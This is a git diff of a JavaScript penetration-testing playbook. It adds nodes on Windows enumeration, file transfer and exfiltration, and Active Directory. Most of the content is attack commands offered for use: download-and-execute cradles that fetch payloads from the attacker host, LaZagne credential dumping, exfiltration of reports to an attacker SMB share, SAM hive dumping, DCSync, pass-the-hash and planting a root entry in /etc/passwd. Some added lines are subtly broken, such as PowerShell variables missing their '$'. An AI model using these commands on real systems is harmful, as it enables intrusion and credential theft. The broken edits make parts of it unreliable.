@@ -12,7 +12,7 @@ const nodes = {
     phase: "RECON",
     title: "Engagement Start",
     body: "Set your variables first — every command references them. What is your current situation?",
-    cmd: `export IP=10.10.10.10
+    cmd: `export ip=10.10.10.10
 export SUBNET=192.168.185.0/24
 export LHOST=10.10.14.x
 export LPORT=443
@@ -48,6 +48,7 @@ cd ~/results/$ip`,
       { label: "Web attacks", next: "jump_web" },
       { label: "SQL injection", next: "jump_sqli" },
       { label: "Shells & payloads", next: "jump_shells" },
+      { label: "File transfer & exfil", next: "transfer_agnostic" },
       { label: "Linux privesc", next: "jump_linux" },
       { label: "Windows privesc", next: "jump_windows" },
       { label: "Active Directory", next: "jump_ad" },
@@ -229,6 +230,10 @@ searchsploit -x <path/to/exploit>`,
       { label: "Client-side attacks", next: "client_side" },
       { label: "AMSI / AV bypass", next: "amsi_bypass" },
       { label: "File transfer — get tools on target", next: "file_transfer" },
+      { label: "Transfer — Agnostic / any OS", next: "transfer_agnostic" },
+      { label: "Transfer — Windows", next: "transfer_windows" },
+      { label: "Transfer — Linux", next: "transfer_linux" },
+      { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
       { label: "Back to jump menu", next: "jump_menu" },
     ],
   },
@@ -262,6 +267,7 @@ searchsploit -x <path/to/exploit>`,
     warn: null,
     choices: [
       { label: "Initial foothold — orient and enumerate", next: "windows_post_exploit" },
+      { label: "Quick enum reference — one-liners", next: "windows_enum_quick" },
       { label: "WinPEAS — automated enum", next: "winpeas" },
       { label: "Token impersonation (Potato attacks)", next: "token_privs" },
       { label: "Unquoted service path", next: "unquoted_service" },
@@ -5143,7 +5149,7 @@ cat /etc/exports && showmount -e $ip
 
 ls -la /etc/passwd
 openssl passwd -1 -salt x pass123
-echo 'r00t:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'r00t:$1$xHASH:0:0:root:/root:/bin/bash' >> /etc/passwd
 
 find / -name "id_rsa" 2>/dev/null
 cat ~/.bash_history
@@ -5219,96 +5225,33 @@ whoami /all
 whoami /priv
 whoami /groups
 hostname
-
-# ── STEP 2: INTEGRITY LEVEL AND UAC ──────────────────
-# Medium = UAC active, High = already elevated
 whoami /groups | findstr "Mandatory Label"
-whoami /groups | findstr /i "integrity"
+# Medium = UAC active, High = already elevated, System = SYSTEM
+# Disabled priv != not present — tools will activate it automatically
 
-# Integrity levels:
-# Low    = sandboxed (browser, AppContainer)
-# Medium = default authenticated user
-# High   = UAC-elevated admin process
-# System = NT AUTHORITY\SYSTEM
+# ── STEP 2: AUTOMATED TOOLS FIRST ────────────────────
+# Run these before manual enum — catches low hanging fruit fast
+# LaZagne — credential dumper
+.\\lazagne.exe all > lazagne.txt
+type lazagne.txt
 
-# Split token — local admins get two tokens at logon:
-# Token 1 = Standard (medium) used for normal work
-# Token 2 = Elevated (high) activated only with UAC consent
-# UAC bypass = get high token without showing consent prompt
+# PrivescCheck — maps to MITRE, produces HTML report
+(new-object net.webclient).downloadstring("http://$LHOST/PrivescCheck.ps1") | iex
+Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML
 
-# UAC prompt types:
-# Consent Prompt    = in Admins group, just click Yes
-# Credential Prompt = not in Admins, must enter admin creds
-# Bypass target     = Consent Prompt scenario
+# WinPEAS
+iwr http://$LHOST/winPEASx64.exe -OutFile winpeas.exe
+.\\winpeas.exe > winpeas.txt
 
-# Horizontal vs Vertical privesc:
-# Horizontal = same priv level, different user (dave -> steve)
-# Vertical   = lower to higher privilege (user -> admin -> SYSTEM)
+# Exfiltrate reports via SMB share
+# On Kali: impacket-smbserver -smb2support kali . -username user -password pass
+net use m: \\\\$LHOST\\\\kali /user:user pass
+copy PrivescCheck_* m:\\
+copy winpeas.txt m:\\
+copy lazagne.txt m:\\
 
-# SID quick reference: S-R-X-Y
-# S-1-0-0  = Null SID
-# S-1-1-0  = Everyone
-# S-1-5-11 = Authenticated Users
-# S-1-5-18 = Local System (SYSTEM)
-# S-1-5-domain-500 = Administrator
-
-# ── STEP 2B: HACKTRICKS CHECKLIST EXTRAS ─────────────
-# ref: hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
-
-# Clipboard — someone may have copied a password
-Get-Clipboard
-
-# Active logged-on sessions — other users connected right now
-query session
-qwinsta
-
-# Password policy — check before brute forcing
-net accounts
-
-# WDigest — if enabled, plaintext creds in LSASS memory
-reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
-# If value = 1 = plaintext creds in memory = run mimikatz sekurlsa::logonpasswords
-
-# AppLocker policy — know what you can/cant run
-Get-AppLockerPolicy -Effective -xml
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-
-# AV check
-WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName
-Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled
-
-# WSUS — check if exploitable (non-SSL WSUS = MiTM possible)
-reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
-# If value = 1 = exploitable with WSUSpicious/pyWSUS
-
-# Hidden local services — look for internal services not exposed
-netstat -ano | findstr "127.0.0.1"
-
-# Saved RDP connections
-reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
-
-# Winlogon autologon creds
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
-
-# AppCmd.exe — IIS credential disclosure
-# If exists: C:\Windows\System32\inetsrv\appcmd.exe
-# appcmd.exe list apppool /processModel.password /xml
-
-# SSH keys in registry (sometimes stored here)
-reg query HKCU\Software\OpenSSH\Agent\Keys
-
-# ── SID QUICK REFERENCE ──────────────────────────────
-# SID format: S-R-X-Y  (S=SID, R=revision, X=authority, Y=sub-authority+RID)
-# RID starts at 1000 for standard users
-# Well-known SIDs:
-# S-1-0-0  = Null SID (no members)
-# S-1-1-0  = Everyone
-# S-1-5-11 = Authenticated Users
-# S-1-5-18 = Local System (NT AUTHORITY\SYSTEM)
-# S-1-5-domainidentifier-500 = Administrator
-# S-1-5-domainidentifier-512 = Domain Admins
+# Open HTML report in browser:
+# file:///home/kali/share/PrivescCheck_HOSTNAME.html
 
 # ── STEP 3: USERS AND GROUPS ──────────────────────────
 net user
@@ -5320,140 +5263,166 @@ Get-LocalGroupMember "Remote Desktop Users"
 Get-LocalGroupMember "Remote Management Users"
 Get-LocalGroupMember "Backup Operators"
 
+# Specific user details
+net user <username>
+# Shows groups, last logon, password policy
+
+# Get SID
+whoami /user
+(New-Object System.Security.Principal.NTAccount("<username>")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+
+# Active sessions
+query session
+qwinsta
+
 # ── STEP 4: OS AND ARCHITECTURE ───────────────────────
 systeminfo
+systeminfo | findstr /i "OS Name\|OS Version\|System Type"
 
 # ── STEP 5: NETWORK ───────────────────────────────────
 ipconfig /all
 route print
 netstat -ano
+netstat -ano | findstr "127.0.0.1"
 arp -a
 
 # ── STEP 6: INSTALLED APPLICATIONS ───────────────────
-Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname
-Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname
-Get-ChildItem "C:\\Program Files", "C:\\Program Files (x86)" | select Name
+# 32-bit apps
+Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,displayversion
+# 64-bit apps
+Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname,displayversion
+Get-ChildItem "C:\\Program Files","C:\\Program Files (x86)" | select Name
 
-# ── STEP 7: RUNNING PROCESSES ─────────────────────────
-# Basic list
-Get-Process
+# ── STEP 7: FILE HUNTING ──────────────────────────────
+# Do this EARLY — notes/configs often contain creds (lab: WelcomeToWinter0121 in diana notes)
+# User home dirs
+Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
+# Read all txt files in a directory at once
+type C:\\Users\\diana\\Documents\\*.txt
 
-# Cross-ref PIDs with netstat
-netstat -ano
+# App-specific configs — based on what you found in Step 6
+# Pattern: Get-ChildItem -Path C:\\<appdir> -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
+# XAMPP example:
+Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
+type C:\\xampp\\passwords.txt
+type C:\\xampp\\mysql\\bin\\my.ini
+# FileZilla example:
+type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
+# IIS example:
+Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | Get-Content
+# Jenkins example:
+Get-ChildItem -Path C:\\ProgramData\\Jenkins -Include *.xml,*.conf -Recurse -ErrorAction SilentlyContinue
+# KeePass — find the database
+Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
-# Full binary path — spot non-standard processes
-Get-Process | Sort-Object ProcessName | Select Id,ProcessName,Path
+# Broad search
+Get-ChildItem -Path C:\\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
-# Filter out standard Windows paths (NonStandardProcess lab pattern)
-Get-Process | Select Id,ProcessName,Path | Where-Object Path -notlike "*Windows*" | Where-Object Path -notlike "*Program Files*"
+# cmd style
+dir /s /b C:\\Users\\*.txt
+dir /s /b C:\\*pass*
 
-# Which user is running a process?
-Get-CimInstance Win32_Process | Select Name,ProcessId,@{N="Owner";E={$_.GetOwner().User}} | Sort Name
-
-# Filter for specific service/process owner:
-Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select Name,State,StartName,ProcessId,PathName
-
-# WMIC process with owner info:
-wmic process list full
-wmic process where "name='mysqld.exe'" get name,processid,executablepath
-
-# Get path of specific process
-Get-Process -Name mysqld | Select -Expand Path
-
-# sc.exe — service config and extended info
-sc.exe qc <ServiceName>
-sc.exe queryex <ServiceName>
-
-# Then check that directory for flags/creds/writable perms
-
-# ── STEP 8: SCHEDULED TASKS ───────────────────────────
-schtasks /query /fo LIST /v
-Get-ScheduledTask | Where TaskPath -notlike "\\Microsoft*" | Select TaskName,TaskPath
-
-# ── STEP 9: SERVICES ──────────────────────────────────
-Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,PathName
-wmic service get name,pathname
-
-# ── STEP 10: POWERSHELL HISTORY (Module 17.1.4) ───────
-# PSReadline history — survives Clear-History
-# Most admins run Clear-History thinking it clears everything — it doesnt
+# ── STEP 8: PS HISTORY AND TRANSCRIPTS ────────────────
+# PSReadline — survives Clear-History
 (Get-PSReadlineOption).HistorySavePath
 type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
 Get-History
-# ── NET USER — enumerate specific user ──────────────
-net user <username>
-# Shows groups, last logon, password policy, etc
-
-# ── WRITE ACCESS TEST ────────────────────────────────
-# Test if you can write to a directory before attempting hijack
-echo "" > C:\\Services\\test.txt
-echo "" > "C:\\Program Files\\EnterpriseApp\\test.txt"
-# If no error = writable
-
-# Check all users history
 Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
 
-# ── EVENT VIEWER — SCRIPT BLOCK LOGS (Event ID 4104) ─
-# GUI method — THIS IS THE RELIABLE WAY (Module 17.1.2)
-# 1. Event Viewer -> Apps and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational
-# 2. Right-click -> Filter Current Log -> Event ID: 4104
-# 3. Scroll through Warning-level events manually
-# 4. Ctrl+F to Find: password, net user, admin, secret, runas
-# 5. Passwords typed in plain text in PS commands show here
-# 6. Check the User field — you can read commands run by OTHER users
-# Note: PS CLI queries for this often fail — use Event Viewer GUI
-
-# ── STEP 11: POWERSHELL TRANSCRIPTS ──────────────────
-# Transcript files = over-the-shoulder recording of PS sessions
-# Often contain plaintext passwords from PSCredential creation
-# Common locations:
+# Transcript files — plaintext PSCredential creation
 Get-ChildItem -Path C:\\Users -Include *transcript* -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\\Users\\Public -Recurse -ErrorAction SilentlyContinue
 type C:\\Users\\Public\\Transcripts\\transcript01.txt
-# Also check:
-# C:\Users\<user>\Documents\PowerShell_transcript.<host>.<random>.<timestamp>.txt
-# C:\Transcripts\
 
-# ── STEP 12: SCRIPT BLOCK LOGGING ────────────────────
-# Check if Script Block Logging is enabled:
-reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
-# View logs via Event Viewer: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
-# Or via PowerShell:
-Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Select -First 20 | Format-List
-# Filter for creds:
-Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where Message -like "*password*" | Format-List
+# Event Viewer 4104 — GUI method (most reliable)
+# Event Viewer -> Apps and Services -> Microsoft -> Windows -> PowerShell -> Operational
+# Filter -> Event ID 4104 -> scroll Warning events -> Ctrl+F: password, net user, admin
 
-# ── STEP 13: SENSITIVE INFO ───────────────────────────
-cmdkey /list
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+# ── STEP 9: RUNNING PROCESSES ────────────────────────
+Get-Process
+Get-Process | Sort-Object ProcessName | Select Id,ProcessName,Path
+# Non-standard processes (not in Windows or Program Files)
+Get-Process | Select Id,ProcessName,Path | Where-Object Path -notlike "*Windows*" | Where-Object Path -notlike "*Program Files*"
+# Who owns each process
+Get-CimInstance Win32_Process | Select Name,ProcessId,@{N="Owner";E={$_.GetOwner().User}} | Sort Name
+
+# ── STEP 10: SERVICES ─────────────────────────────────
+# All running services
+Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,State,PathName
+# Spot non-standard paths (not in Windows dir)
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+
+# Drill into specific service — who runs it
+Get-CimInstance Win32_Service -Filter "Name='EnterpriseService'" | Select Name,State,StartName,ProcessId,PathName
+# StartName = which account runs it
+
+# Check permissions on service directory
+icacls "C:\Services"
+# NT AUTHORITY\Authenticated Users:(M) = you can write = hijack possible
+# Write test
+echo "" > "C:\Services\test.txt"
+
+# Service config
+sc.exe qc <ServiceName>
+sc.exe queryex <ServiceName>
+
+# Unquoted paths
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+
+# ── STEP 11: SCHEDULED TASKS ──────────────────────────
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run\|next run"
+Get-ScheduledTask | Where TaskPath -notlike "\\Microsoft*" | Select TaskName,TaskPath
+
+# ── STEP 12: PRIVESC QUICK CHECKS ────────────────────
+# Spooler running? (needed for PrintSpoofer)
+sc.exe queryex spooler
+# State STOPPED = PrintSpoofer/PrintNightmare wont work
 
 # AlwaysInstallElevated
 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
 reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
 
-# ── STEP 14: CREDENTIAL FILES ─────────────────────────
-Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -ErrorAction SilentlyContinue
+# Winlogon autologon
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
+
+# WDigest — plaintext creds in LSASS
+reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
+
+# Clipboard
+Get-Clipboard
+
+# Credential manager
+cmdkey /list
+
+# AV check
+Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled
+
+# ── STEP 13: CREDENTIAL FILES ─────────────────────────
+Get-ChildItem -Path C:\\ -Include unattend.xml,sysprep.xml,sysprep.inf -Recurse -ErrorAction SilentlyContinue
 type C:\\Windows\\Panther\\Unattend.xml
-type C:\\Windows\\System32\\sysprep\\sysprep.xml
 type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
-type C:\\xampp\\mysql\\bin\\my.ini
 Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | Get-Content
 Get-ChildItem Env: | Select Name,Value
+
+# ── STEP 14: SAM DUMP (if SeBackupPrivilege or SYSTEM) ─
+reg save HKLM\\sam sam
+reg save HKLM\\SYSTEM system
+reg save HKLM\\SECURITY security
+# Transfer via SMB then:
+# impacket-secretsdump -sam sam -system system local
+# impacket-psexec Administrator@$ip -hashes :NTLMHASH
 
 # ── STEP 15: GRAB FLAGS ───────────────────────────────
 type C:\\Users\\$env:USERNAME\\Desktop\\local.txt
 Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue | Get-Content
 
-# ── HIGH VALUE TARGETS ────────────────────────────────
-# PSReadline history -> passwords typed in commands
-# Transcript files   -> PSCredential creation with plaintext passwords
-# Script Block Logs  -> encoded commands decoded automatically
-# KeePass            -> keepass2john -> crack master password
-# FileZilla          -> sitemanager.xml for saved creds
-# XAMPP              -> my.ini for MySQL creds (try all users)
-# whoami /priv       -> SeImpersonatePrivilege = instant SYSTEM via GodPotato`,
+# ── NOTE: ENUMERATION IS CYCLICAL ────────────────────
+# Every new user = start over from Step 1
+# Lab pattern: diana(file notes)->alex(horizontal)->enterprise(DLL)->SeBackupPriv->SAM dump
+# New user = new files readable, new services accessible, new history
+# Always re-run whoami /priv and check group memberships after pivoting`,
     warn: "PSReadline history survives Clear-History — always check it. Transcript files often contain PSCredential creation commands with plaintext passwords. Re-enumerate fully after gaining each new user account — permissions change and you unlock new files.",
     choices: [
       { label: "SeImpersonatePrivilege in whoami /priv", next: "token_privs" },
@@ -5472,6 +5441,103 @@ Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -ErrorAction
 
 
 
+
+  windows_enum_quick: {
+    phase: "WINDOWS",
+    title: "Windows Enum — Quick Reference",
+    body: "One-liners only. No explanations. Run top to bottom on a new foothold. Full detail is in windows_post_exploit.",
+    cmd: `# ── IDENTITY ─────────────────────────────────────────
+whoami /all
+whoami /priv
+hostname
+systeminfo | findstr /i "OS Name\|OS Version\|System Type"
+
+# ── USERS & GROUPS ───────────────────────────────────
+net user
+net localgroup
+Get-LocalGroupMember Administrators
+Get-LocalGroupMember "Remote Management Users"
+net user <username>
+whoami /groups | findstr /i "integrity"
+query session
+
+# Get SID
+whoami /user
+(New-Object System.Security.Principal.NTAccount("<user>")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+
+# ── NETWORK ──────────────────────────────────────────
+ipconfig /all
+netstat -ano
+netstat -ano | findstr "127.0.0.1"
+arp -a
+route print
+
+# ── PROCESSES ────────────────────────────────────────
+Get-Process | Select Id,ProcessName,Path | Where-Object Path -notlike "*Windows*" | Where-Object Path -notlike "*Program Files*"
+Get-CimInstance Win32_Process | Select Name,ProcessId,@{N="Owner";E={$_.GetOwner().User}} | Sort Name
+
+# ── SERVICES ─────────────────────────────────────────
+Get-CimInstance Win32_Service | Where State -eq "Running" | Select Name,State,PathName
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+Get-CimInstance Win32_Service -Filter "Name='<svcname>'" | Select Name,State,StartName,PathName
+sc.exe qc <ServiceName>
+
+# ── APPLICATIONS ─────────────────────────────────────
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,displayversion
+Get-ChildItem "C:\Program Files","C:\Program Files (x86)" | select Name
+
+# ── SCHEDULED TASKS ──────────────────────────────────
+schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run\|next run"
+Get-ScheduledTask | Where TaskPath -notlike "\Microsoft*" | Select TaskName,TaskPath
+
+# ── INTERESTING REGISTRY ─────────────────────────────
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
+reg query HKCU\Software\Microsoft\Terminal Server Client\Servers
+reg query HKCU\Software\OpenSSH\Agent\Keys
+cmdkey /list
+
+# ── PS HISTORY & TRANSCRIPTS ─────────────────────────
+type C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
+Get-ChildItem C:\Users -Include *transcript* -Recurse -ErrorAction SilentlyContinue
+
+# ── FILE HUNTING ─────────────────────────────────────
+Get-ChildItem C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.config,*.ps1,*.bat,*.log,*.bak -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\ -Include *pass*,*cred*,*secret*,*vnc*,*.kdbx,*config*,*unattend* -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+type C:\Users\$env:USERNAME\AppData\Roaming\FileZilla\sitemanager.xml
+
+# ── PERMISSIONS CHECK ────────────────────────────────
+icacls "C:\path\to\binary.exe"
+echo "" > "C:\path\test.txt"
+
+# ── AV / DEFENCES ────────────────────────────────────
+Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled
+WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+
+# ── QUICK PRIVESC CHECKS ─────────────────────────────
+whoami /priv
+# SeImpersonatePrivilege = GodPotato/SigmaPotato -> SYSTEM
+# SeBackupPrivilege      = reg save SAM/SYSTEM -> dump hashes
+# SeDebugPrivilege       = mimikatz token::elevate
+Get-ChildItem C:\Windows\System32\inetsrv\appcmd.exe -ErrorAction SilentlyContinue`,
+    warn: null,
+    choices: [
+      { label: "SeImpersonatePrivilege — Potato attack", next: "token_privs" },
+      { label: "In Admins but medium integrity — UAC bypass", next: "win_uac_bypass" },
+      { label: "Interesting service found", next: "weak_service" },
+      { label: "Unquoted service path", next: "unquoted_service" },
+      { label: "Creds found in files/history", next: "windows_creds" },
+      { label: "Run full automated enum", next: "winpeas" },
+      { label: "Kernel exploits — missing patches", next: "win_kernel_exploit" },
+    ],
+  },
 
   winpeas: {
     phase: "WINDOWS",
@@ -6567,8 +6633,8 @@ Add-DomainObjectAcl \\
   -Rights DCSync
 
 # ForceChangePassword
-$cred = New-Object System.Net.NetworkCredential("","NewPass123!")
-Set-DomainUserPassword -Identity target -AccountPassword $cred.SecurePassword
+cred = New-Object System.Net.NetworkCredential("","NewPass123!")
+Set-DomainUserPassword -Identity target -AccountPassword cred.SecurePassword
 
 # DCSync once you have rights
 .\\mimikatz.exe "privilege::debug" \\
@@ -6654,12 +6720,12 @@ Enter-PSSession -ComputerName $TARGET -Credential domain\\admin`,
   "exit"
 
 # impacket-secretsdump (from Kali — no agent)
-impacket-secretsdump domain/admin:'pass'@$DCIP
-impacket-secretsdump domain/admin@$DCIP -hashes :NTLM_HASH
-impacket-secretsdump domain/admin:'pass'@$DCIP -just-dc-ntlm
+impacket-secretsdump domain/admin:'pass'@<DCIP>
+impacket-secretsdump domain/admin@<DCIP> -hashes :NTLM_HASH
+impacket-secretsdump domain/admin:'pass'@<DCIP> -just-dc-ntlm
 
 # PTH to DC as Administrator
-evil-winrm -i $DCIP -u administrator -H <NTLM_HASH>`,
+evil-winrm -i <DCIP> -u administrator -H <NTLM_HASH>`,
     warn: null,
     choices: [
       { label: "Domain Admin shell on DC — grab proof", next: "ad_complete" },
@@ -6918,8 +6984,8 @@ powershell -c "wget https://$LHOST/shell.exe -OutFile C:\Windows\Temp\shell.exe 
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')"
 
 # Encoded download cradle
-$CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
-echo $CMD | iconv -t UTF-16LE | base64 -w0
+CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
+echo CMD | iconv -t UTF-16LE | base64 -w0
 powershell -nop -w hidden -enc [OUTPUT]
 
 # -- VERIFY TRANSFER -----------------------
@@ -6935,6 +7001,241 @@ certutil -hashfile C:\Windows\Temp\shell.exe MD5`,
       { label: "Back to jump menu", next: "jump_menu" },
     ],
   },
+  transfer_agnostic: {
+    phase: "SHELL",
+    title: "File Transfer — Agnostic (Any OS)",
+    body: "Methods that work regardless of OS. Start here if you don't know what's available on the target.",
+    cmd: `# ── ATTACKER SIDE — SERVE FILES ──────────────────────
+# Python HTTP server (fastest, most reliable)
+python3 -m http.server 80
+python3 -m http.server 8080   # if 80 blocked
+python3 -m http.server 443    # if filtered by port
+
+# impacket SMB share (best for Windows targets)
+impacket-smbserver -smb2support share .
+impacket-smbserver -smb2support share /path/to/tools -username user -password pass
+
+# FTP server
+python3 -m pyftpdlib -p 21 -w
+
+# HTTPS server (self-signed)
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
+python3 -c "import ssl,http.server; ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain('cert.pem','key.pem'); httpd=http.server.HTTPServer(('',443),http.server.SimpleHTTPRequestHandler); httpd.socket=ctx.wrap_socket(httpd.socket); httpd.serve_forever()"
+
+# ── BASE64 TRANSFER (no network tools needed) ─────────
+# Attacker — encode file
+base64 -w0 linpeas.sh && echo
+cat linpeas.sh | base64 -w0
+
+# Target — paste and decode
+echo "BASE64STRING" | base64 -d > /tmp/linpeas.sh
+echo "BASE64STRING" | base64 -d > C:\\Windows\\Temp\\tool.exe
+
+# ── NC TRANSFER (no HTTP available) ──────────────────
+# Attacker — send file
+nc -nlvp 4444 < tool.exe
+
+# Target — receive file
+nc $LHOST 4444 > /tmp/tool
+nc.exe $LHOST 4444 > C:\\Windows\\Temp\\tool.exe
+
+# ── VERIFY INTEGRITY ──────────────────────────────────
+# Linux
+md5sum /tmp/tool
+sha256sum /tmp/tool
+# Windows
+certutil -hashfile C:\\Windows\\Temp\\tool.exe MD5
+Get-FileHash C:\\Windows\\Temp\\tool.exe -Algorithm MD5`,
+    warn: null,
+    choices: [
+      { label: "Windows target", next: "transfer_windows" },
+      { label: "Linux target", next: "transfer_linux" },
+      { label: "Exfiltrate data out", next: "transfer_exfil" },
+    ],
+  },
+
+  transfer_windows: {
+    phase: "SHELL",
+    title: "File Transfer — Windows (Download Tools)",
+    body: "Get tools onto a Windows target. iwr and certutil are your defaults. SMB is the most reliable when HTTP is blocked.",
+    cmd: `# ── IWR / INVOKE-WEBREQUEST (PowerShell) ─────────────
+iwr http://$LHOST/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
+iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
+Unblock-File C:\\Windows\\Temp\\wp.exe
+
+# In-memory (never touches disk — best for AV evasion)
+IEX(New-Object Net.WebClient).DownloadString("http://$LHOST/PowerUp.ps1")
+(new-object net.webclient).downloadstring("http://$LHOST/PrivescCheck.ps1") | iex
+
+# ── CERTUTIL (LOLBin — built-in) ─────────────────────
+certutil -urlcache -split -f http://$LHOST/shell.exe C:\\Windows\\Temp\\shell.exe
+certutil -urlcache -split -f http://$LHOST/shell.exe shell.exe
+# Encode/decode (useful if direct download blocked)
+certutil -encode C:\\Windows\\Temp\\file.exe file.b64
+certutil -decode file.b64 C:\\Windows\\Temp\\file.exe
+
+# ── SMB SHARE (best when HTTP blocked) ───────────────
+# Attacker (Kali):
+# impacket-smbserver -smb2support kali . -username user -password pass
+
+# Target — map drive and copy
+net use m: \\\\$LHOST\\kali /user:user pass
+copy \\\\$LHOST\\kali\\shell.exe C:\\Windows\\Temp\\shell.exe
+# Or just run directly from share:
+\\\\$LHOST\\kali\\shell.exe
+
+# Disconnect when done
+net use m: /delete
+
